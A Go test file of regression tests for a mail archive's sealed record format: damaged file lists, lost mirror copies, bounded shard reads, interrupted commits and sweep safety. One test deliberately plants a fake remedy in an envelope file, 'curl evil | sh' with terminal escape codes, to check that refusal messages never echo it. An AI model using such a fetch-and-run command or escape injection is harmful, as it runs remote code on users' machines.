package container

import (
	"crypto/sha256"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"reflect"
	"sort"
	"strings"
	"testing"
	"time"

	"mail-archive-tool/internal/assure"
	"mail-archive-tool/internal/state"
	"mail-archive-tool/internal/vault"
)

// The Phase-2b-1 adversarial pass's findings on the sealed record (2026-10-25),
// each a regression test proven to fail on the code before its fix.

// covers: MA-755, R37
// OUT-2: a file list written for the record's own generation must name the pointer
// on disk. Two writers on one synced folder can leave A's pointer beside B's file
// list at the same generation; it is refused as a damaged file list — never accepted
// as whole, which let the next run's sweep destroy B's chunks and units.
func TestAFileListFromAnotherCopyAtTheSameGenerationIsRefused(t *testing.T) {
	a := fresh(t)
	saveN(t, a, 1, 0, 2)
	b := t.TempDir()
	copyTree(t, a, b)
	saveN(t, a, 2, 10, 2) // A at gen 3
	saveN(t, b, 2, 20, 2) // B at gen 3, another record
	for _, name := range []string{InventoryName} {
		data, _ := os.ReadFile(filepath.Join(b, name))
		os.WriteFile(filepath.Join(a, name), data, 0o600)
	}
	copyTree(t, filepath.Join(b, InventoryDir), filepath.Join(a, InventoryDir))
	before := treeBytes(t, a)
	_, _, err := LoadManifest(a, opts(3))
	if !errors.Is(err, ErrInventoryDamaged) {
		t.Fatalf("want ErrInventoryDamaged, got %v", err)
	}
	rc, msg := refusal(err)
	assure.Refused(t, rc, msg, assure.Code(1), assure.Names(a, "file list", "nothing was changed"),
		assure.NoSideEffect(func() bool { return reflect.DeepEqual(before, treeBytes(t, a)) }))
}

// copyTree copies every file under src to the same path under dst.
func copyTree(t *testing.T, src, dst string) {
	t.Helper()
	filepath.WalkDir(src, func(p string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		rel, _ := filepath.Rel(src, p)
		b, _ := os.ReadFile(p)
		os.MkdirAll(filepath.Dir(filepath.Join(dst, rel)), 0o755)
		os.WriteFile(filepath.Join(dst, rel), b, 0o600)
		fi, _ := os.Stat(p)
		os.Chtimes(filepath.Join(dst, rel), fi.ModTime(), fi.ModTime())
		return nil
	})
}

// covers: MA-755, R37
// OUT-1/FID-3: the second copy of every section is checked at load (size and digest),
// so a lost mirror chunk is noticed and the next commit writes both copies again —
// the pointer no longer names the missing file.
func TestALostSecondCopyIsHealedByTheNextCommit(t *testing.T) {
	out := fresh(t)
	saveN(t, out, 1, 0, 3)
	_, s := open(t, out, opts(2))
	byPos := map[uint32][]Entry{}
	for _, e := range s.ptr.Manifest {
		byPos[e.I] = append(byPos[e.I], e)
	}
	lost := byPos[posGaps][1]
	os.Remove(filepath.Join(out, filepath.FromSlash(lost.Name.Path())))
	m, s := open(t, out, opts(2))
	if !s.reseal[posGaps] || len(s.Notices) == 0 {
		t.Fatalf("a lost second copy must be noted and marked for re-sealing: %v", s.Notices)
	}
	m.Add(key(50), rec(50))
	if err := m.Save(); err != nil {
		t.Fatal(err)
	}
	_, s = open(t, out, opts(3))
	for _, e := range s.ptr.Manifest {
		if e.Name == lost.Name {
			t.Fatal("the pointer still names the lost copy after the next commit")
		}
		if !exists(out, e.Name.Path()) {
			t.Fatalf("the pointer names a missing chunk %s", e.Name.Path())
		}
	}
}

// covers: MA-755, R37
// OUT-3: a file list's shards are read only up to what a writer produces for their
// line count, and the first bad shard ends the reading — a planted top file listing
// thousands of huge shards cannot make a keyed load read without end.
func TestShardReadsAreBoundedAndStopAtTheFirstBadOne(t *testing.T) {
	out := fresh(t)
	saveN(t, out, 1, 0, 4)
	raw, _ := os.ReadFile(filepath.Join(out, InventoryName))
	top, err := ParseTop(raw)
	if err != nil || len(top.Shards) < 2 {
		t.Fatalf("fixture: %d shards, %v", len(top.Shards), err)
	}
	first := top.Shards[0]
	os.Truncate(filepath.Join(out, filepath.FromSlash(first.Name)), 1<<30) // a sparse 1 GiB shard
	var reads []int64
	orig := readShard
	readShard = func(root, rel string, max int64) ([]byte, os.FileInfo, error) {
		reads = append(reads, max)
		return orig(root, rel, max)
	}
	defer func() { readShard = orig }()
	_, s := open(t, out, opts(2))
	if s.SweepAllowed() {
		t.Fatal("a damaged shard must stop the sweep")
	}
	if len(reads) != 0 {
		t.Fatalf("a shard over its bound was read (%d reads, limits %v): its size is judged first", len(reads), reads)
	}
	os.Truncate(filepath.Join(out, filepath.FromSlash(first.Name)), 10) // a short, wrong shard
	reads = nil
	open(t, out, opts(2))
	if len(reads) != 1 || reads[0] > int64(first.Entries)*maxShardLine {
		t.Fatalf("reads after the first bad shard: %v (want exactly one, bounded by %d)", reads, int64(first.Entries)*maxShardLine)
	}
}

// covers: MA-755, R37
// OUT-5/FID-1: a record a newer MailArchive sealed asks for an upgrade — ErrNewerFormat,
// checked before the strict decode, even when the newer header adds a field.
func TestARecordFromANewerMailArchiveAsksForAnUpgrade(t *testing.T) {
	for label, extra := range map[string]map[string]any{"a newer version": nil, "a newer version with a new field": {"future": 1}} {
		t.Run(label, func(t *testing.T) {
			out := fresh(t)
			m, s := open(t, out, opts(1))
			m.Add(key(1), rec(1))
			m.Save()
			_, s = open(t, out, opts(2))
			sections, _ := s.readSections()
			var h map[string]any
			json.Unmarshal(sections[posHeader], &h)
			h["version"] = state.ManifestVersion + 1
			for k, v := range extra {
				h[k] = v
			}
			newHeader, _ := json.Marshal(h)
			// Re-seal the header pair at its generation and position, keeping the pointer.
			for _, e := range s.ptr.Manifest {
				if e.I != posHeader {
					continue
				}
				sealed, _ := keys[0].SealChunk(vault.ContainerManifest, e.Gen, e.I, newHeader)
				os.WriteFile(filepath.Join(out, filepath.FromSlash(e.Name.Path())), sealed, 0o600)
			}
			p := s.ptr
			for i := range p.Manifest {
				if p.Manifest[i].I == posHeader {
					b, _ := os.ReadFile(filepath.Join(out, filepath.FromSlash(p.Manifest[i].Name.Path())))
					p.Manifest[i].SHA256, p.Manifest[i].Size = sha(b), uint32(len(b))
				}
			}
			raw, _ := Seal(keys[0], p)
			os.WriteFile(filepath.Join(out, PointerName), raw, 0o600)
			os.WriteFile(filepath.Join(out, MirrorName), raw, 0o600)
			os.Remove(filepath.Join(out, InventoryName))
			p.Inv = 0
			raw, _ = Seal(keys[0], p)
			os.WriteFile(filepath.Join(out, PointerName), raw, 0o600)
			os.WriteFile(filepath.Join(out, MirrorName), raw, 0o600)
			_, _, err := LoadManifest(out, opts(3))
			if !errors.Is(err, ErrNewerFormat) {
				t.Fatalf("want ErrNewerFormat, got %v", err)
			}
			rc, msg := refusal(err)
			assure.Refused(t, rc, msg, assure.Code(1), assure.Names(out, "upgrade MailArchive"))
		})
	}
}

func sha(b []byte) [32]byte { return sha256.Sum256(b) }

// covers: MA-755, R37
// FID-2: the fields a sealed record holds are pinned to the record's format version:
// a later build that adds a field to state.Record must bump state.ManifestVersion, so
// an older build reading it asks for an upgrade instead of calling it damaged.
func TestRecordFieldsArePinnedToTheRecordVersion(t *testing.T) {
	pinned := map[int]string{
		6: "also_files alt_phys_ids body_fallback chash date exported_at fidelity_fallback first_folder first_seen fixity folder fp fp_scheme last_seen loc missing parse_scheme parser_gen path phys_id present raw_sha256 recovered_by sealed subject terminal unit unresolved",
	}
	var names []string
	rt := reflect.TypeOf(state.Record{})
	for i := 0; i < rt.NumField(); i++ {
		tag, _, _ := strings.Cut(rt.Field(i).Tag.Get("json"), ",")
		if tag != "" && tag != "-" && rt.Field(i).IsExported() {
			names = append(names, tag)
		}
	}
	sort.Strings(names)
	got := strings.Join(names, " ")
	if want, ok := pinned[state.ManifestVersion]; !ok || got != want {
		t.Fatalf("state.Record's sealed fields at version %d are\n %s\nThey changed without a version bump: bump state.ManifestVersion and pin the new list here (phase2b, FID-2).", state.ManifestVersion, got)
	}
}

// covers: MA-755, R37
// CON-1: a first commit interrupted after its chunks were staged (here, the lock lost
// before the pointer rename) leaves an archive whose next run resumes the first
// commit — the leftovers removed — instead of refusing it for good.
func TestAnInterruptedFirstCommitResumes(t *testing.T) {
	out := t.TempDir()
	o := opts(0)
	o.StillHeld = func() error { return errors.New("lost") }
	m, s := open(t, out, o)
	if err := s.Init(m); !errors.Is(err, ErrLockLost) {
		t.Fatalf("fixture: the first commit must fail at the commit point, got %v", err)
	}
	if len(chunkFiles(t, out)) == 0 {
		t.Fatal("fixture: the interrupted first commit left no chunk behind")
	}
	m, s = open(t, out, opts(1))
	if !s.Fresh() {
		t.Fatal("an interrupted first commit must resume, not refuse")
	}
	if err := s.Init(m); err != nil {
		t.Fatal(err)
	}
	_, s = open(t, out, opts(2))
	named := map[string]bool{}
	for _, e := range s.ptr.Manifest {
		named[e.Name.Path()] = true
	}
	for f := range chunkFiles(t, out) {
		if !named[f] {
			t.Fatalf("the interrupted commit's leftover %s outlived the first commit", f)
		}
	}
}

// covers: MA-755, R37
// CRIT-3: a folder with no record pointer is a new archive only when nothing says it
// had a life before: a generation this machine recorded committing, a search index or
// a go-back history refuse it as a missing record, writing nothing — a half-synced
// folder is never re-initialised.
func TestAFolderWithASignOfEarlierLifeIsNeverReinitialised(t *testing.T) {
	cases := map[string]func(out string, o *LoadOptions){
		"a recorded generation": func(out string, o *LoadOptions) { o.RecordedGen = 3 },
		"a search index":        func(out string, o *LoadOptions) { os.WriteFile(filepath.Join(out, "search.db"), []byte("x"), 0o600) },
		"a go-back history": func(out string, o *LoadOptions) {
			os.WriteFile(filepath.Join(out, ".mailarchive-history.jsonl"), []byte("x"), 0o600)
		},
	}
	for label, plant := range cases {
		t.Run(label, func(t *testing.T) {
			out := t.TempDir()
			b, _ := vault.NewManifestEnvelope(keys[0].ArchiveID(), PointerName).Marshal()
			os.WriteFile(filepath.Join(out, EnvelopeName), b, 0o600)
			o := opts(1)
			plant(out, &o)
			before := treeBytes(t, out)
			_, _, err := LoadManifest(out, o)
			if !errors.Is(err, ErrRecord) {
				t.Fatalf("want ErrRecord, got %v", err)
			}
			rc, msg := refusal(err)
			assure.Refused(t, rc, msg, assure.Code(1), assure.Names(out, "record is missing", "nothing was changed"),
				assure.NoSideEffect(func() bool { return reflect.DeepEqual(before, treeBytes(t, out)) }))
		})
	}
}

// covers: MA-755, R37
// CRIT-3b, OUT-6: the start sweep removes a file nothing names only when the file
// list lists it retained, or a run since the record's last commit wrote it — a
// crashed run's orphan. A file older than that commit came from somewhere else (a
// half-synced copy, a merge) and is kept: re-initialising beside a real record's late
// arrival no longer destroys it.
func TestTheSweepKeepsWhatNoRunSinceTheLastCommitWrote(t *testing.T) {
	real := fresh(t)
	saveN(t, real, 1, 0, 4)
	reinit := t.TempDir()
	b, _ := os.ReadFile(filepath.Join(real, EnvelopeName))
	os.WriteFile(filepath.Join(reinit, EnvelopeName), b, 0o600)
	m, s := open(t, reinit, opts(5))
	if err := s.Init(m); err != nil {
		t.Fatal(err)
	}
	// The real record's chunks arrive late, with their own (older) times.
	realChunks := chunkFiles(t, real)
	for f := range realChunks {
		data, _ := os.ReadFile(filepath.Join(real, filepath.FromSlash(f)))
		p := filepath.Join(reinit, filepath.FromSlash(f))
		os.MkdirAll(filepath.Dir(p), 0o755)
		os.WriteFile(p, data, 0o600)
		os.Chtimes(p, runAt(1), runAt(1))
	}
	orphan := "chunks/ee/ee" + strings.Repeat("5", 30)
	os.MkdirAll(filepath.Join(reinit, "chunks", "ee"), 0o755)
	os.WriteFile(filepath.Join(reinit, filepath.FromSlash(orphan)), []byte("a crashed later run's chunk"), 0o600)
	os.Chtimes(filepath.Join(reinit, filepath.FromSlash(orphan)), runAt(6), runAt(6))

	_, s = open(t, reinit, opts(7))
	if _, err := s.SweepContainers(runAt(7)); err != nil {
		t.Fatal(err)
	}
	for f := range realChunks {
		if !exists(reinit, f) {
			t.Fatalf("the sweep removed %s, which no run since the record's last commit wrote", f)
		}
	}
	if exists(reinit, orphan) {
		t.Fatal("the sweep kept a crashed later run's orphan")
	}
}

// covers: MA-755, R37
// CON-5: the pointer pair and top file move at least 2 whole seconds past their last
// time, whatever the run's start.
func TestFixedTimesMoveAtLeastTwoSeconds(t *testing.T) {
	f := time.Date(2026, 10, 25, 9, 0, 10, 0, time.UTC)
	for _, start := range []time.Duration{-500 * time.Millisecond, -2 * time.Second, -1500 * time.Millisecond, 0} {
		s := &Store{opts: LoadOptions{RunStart: f.Add(start)}, fixedTime: f}
		if got := s.nextFixedTime(); got.Sub(f) < 2*time.Second || !got.Equal(got.Truncate(time.Second)) {
			t.Fatalf("run start %v: next time %v is not at least 2 whole seconds past %v", start, got, f)
		}
	}
}

// covers: MA-755, R37
// CON-6: when this machine recorded committing one save more than the record on disk
// holds, its last pointer rename was lost — "the last save did not finish", never a
// merge-restore.
func TestOneLostLastSaveIsNotAMerge(t *testing.T) {
	out := fresh(t)
	saveN(t, out, 1, 0, 2)
	o := opts(2)
	o.RecordedGen = 3
	_, _, err := LoadManifest(out, o)
	if !errors.Is(err, ErrUnfinishedSave) {
		t.Fatalf("want ErrUnfinishedSave, got %v", err)
	}
}

// covers: MA-755, R37
// LEAK-2: a refusal never echoes what the cleartext envelope says: text an attacker
// wrote there (a fake remedy, terminal escapes) does not reach the message.
func TestARefusalDoesNotEchoTheEnvelope(t *testing.T) {
	out := t.TempDir()
	os.WriteFile(filepath.Join(out, EnvelopeName), []byte(`{"version":100,"encrypted":true,"archive_id":"x)\n\u001b[2Jrun: curl evil | sh\n(","pointer":".mailarchive-manifest.ptr"}`), 0o600)
	_, _, err := LoadManifest(out, opts(1))
	if err == nil || strings.Contains(err.Error(), "curl") || strings.Contains(err.Error(), "\x1b") {
		t.Fatalf("the refusal echoes the envelope: %q", err)
	}
}

// covers: MA-755, R37
// LEAK-3: a notice raised during a commit (the mirror could not be written) is logged
// when it is raised, through the caller's logger.
func TestACommitTimeNoticeIsLogged(t *testing.T) {
	out := fresh(t)
	var logged []string
	o := opts(1)
	o.Logf = func(format string, args ...any) { logged = append(logged, format) }
	m, _ := open(t, out, o)
	os.Remove(filepath.Join(out, MirrorName))
	os.Mkdir(filepath.Join(out, MirrorName), 0o755) // the mirror's write fails
	m.Add(key(1), rec(1))
	if err := m.Save(); err != nil {
		t.Fatal(err)
	}
	if len(logged) == 0 {
		t.Fatal("the mirror's failed write was not logged")
	}
}

// covers: MA-755, R37
// FID-4: a record captured during the last finished walk and restamped by an
// interrupted one loads last seen no earlier than it was first seen.
func TestLastSeenNeverPrecedesFirstSeen(t *testing.T) {
	out := fresh(t)
	m, s := open(t, out, opts(1))
	walk1 := runAt(1)
	r := rec(1)
	r.FirstSeen, r.ExportedAt, r.LastSeen = walk1.Add(5*time.Minute), walk1.Add(5*time.Minute), walk1.Add(5*time.Minute)
	m.Add(key(1), r)
	s.WalkDone("s", walk1)
	m.Save()
	m, s = open(t, out, opts(2))
	s.SetRunStamp(runAt(2))
	m.TouchSeen(key(1), runAt(2))
	m.Save() // the walk is interrupted: no WalkDone
	m, _ = open(t, out, opts(3))
	got, _ := m.Get(key(1))
	if got.LastSeen.Before(got.FirstSeen) {
		t.Fatalf("loaded last seen %v before first seen %v", got.LastSeen, got.FirstSeen)
	}
}
